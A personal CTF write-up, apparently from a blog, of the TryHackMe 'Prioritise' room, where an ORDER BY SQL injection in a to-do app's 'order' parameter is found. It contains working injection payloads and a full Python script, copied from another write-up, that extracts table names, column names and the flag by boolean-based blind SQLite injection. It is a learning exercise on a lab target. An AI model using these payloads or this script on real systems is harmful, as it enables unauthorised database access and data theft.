---
created: 2026-01-26
tags:
  - note
  - journal
  - cyberStuff
title: Prioritise
draft: false
date:
subiect:
  - sql
dificultate: 2
amuca: false
link:
  - https://tryhackme.com/room/prioritise
lastmod: 2026-02-05T06:50:48.429Z
---
Description:\
"We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though...?"

i checked the website and add a new task on the to do list ![](/images/blog-ul-meu/static/Pasted%20image%2020260126120647.png)\
lets check a basic sql injection\
![](/images/blog-ul-meu/static/Pasted%20image%2020260126120808.png)\
nothing special in the begining\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127055947.png)\
i created a new event in the tasklist and intercept it via burpsuite to look for something special\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127060055.png)\
the request seams normal\
i want tot try to modify the conent-length field may be we can buffer overflow this\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127060232.png)\
nothing special

OK SOMETHING SPECIAL HAPPENS WHEN we try to change the order parameter ,\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127060600.png)\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127060609.png)\
we can modify the order parameter as we want

I setted the value of order to:\
`   title%20DESC%20--   `\
and get the following\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127060725.png)\
ok cool i think we encounter a order by sql injection :\
https://portswigger.net/support/sql-injection-in-the-query-structure

to check bbeter for a msql injection i tried the following payload :` http://10.64.190.116/?order=(CASE%20WHEN%20(1=1)%20THEN%20title%20ELSE%20date%20END);%20--`

![](/images/blog-ul-meu/static/Pasted%20image%2020260127063021.png)\
Since the application is vulnerable to boolean-based blind SQL injection, we can manually extract some initial information needed for the flag.

For the next four sections, we will be using the payloads from this awesome repo: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md>

since i dont know how to write python for and now , and i dont have time to invest in this rn i found this scipt in this write up :\
https://medium.com/@lorenzomoulin/tryhackme-prioritise-15ef05623e48

```
import requests  
import threading  
  
chars = [chr(i) for i in range(33, 127)]  
  
s = requests.Session()  
  
url = "http://<IP>/"  
  
ok = s.get(url + r"?order=(CASE%20WHEN%20(1=1)%20THEN%20title%20ELSE%20date%20END);%20--")  
ok = ok.content  
  
ans = ['' for i in range(38)]  
  
table_name = ""  
column_name = ""  
flag = ""  
  
def do_column_name(i: int, u: str, c: str):  
    payload = f"""?order=(CASE%20WHEN%20(SELECT%20substr(name,%20{i},%201)%20FROM%20pragma_table_info('{table_name}'))=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--"""  
    return s.get(u+payload)  
  
def do_table_name(i: int, u: str, c: str):  
    payload = f"""?order=(CASE%20WHEN%20(SELECT%20substr(name,%20{i},%201)%20FROM%20sqlite_schema%20WHERE%20type%20='table'%20LIMIT%201%20OFFSET%201)=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--"""  
    return s.get(u+payload)  
  
def do_get_flag(i: int, u: str, c: str):  
    payload = f"""?order=(CASE%20WHEN%20(SELECT%20substr({column_name},%20{i},%201)%20FROM%20{table_name})=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--"""  
    return s.get(u+payload)  
  
def tgt(i: int):  
    for c in chars:  
        fail = True  
        while fail:  
            try:  
                if action == "flag":  
                    response = do_get_flag(i, url, c)  
                elif action == "table":  
                    response = do_table_name(i, url, c)  
                else:  
                    response = do_column_name(i, url, c)  
            except:  
                continue  
            else:  
                fail = False  
        if response.content == ok:  
            ans[i-1] = c  
            break  
  
actions = ["table", "column", "flag"]  
for action in actions:  
    threads = list()  
  
    for j in range(38):  
        t = threading.Thread(target=tgt, args=(j+1, ))  
        t.start()  
        threads.append(t)  
  
    for t in threads:  
        t.join()  
    print(f"action: {action}")  
    print(''.join(ans))  
    if action == "table":  
        table_name = ''.join(ans)  
    elif action == "column":  
        column_name = ''.join(ans)  
    else:  
        flag = ''.join(ans)  
    ans = ['' for i in range(38)]
    
```

since it fells quite like cheating to do this i gonna try to explain the best i can what does the scirpt\
ok so for what i get after reading the sciprt in few time , it kinda brute forces the name of the table of the flag , being "secret\_flag" after that it bruteforces the name of the column being "flag\_value" and the in display it .\
![](/images/blog-ul-meu/static/Pasted%20image%2020260127071247.png)\
and hooray we find the flag
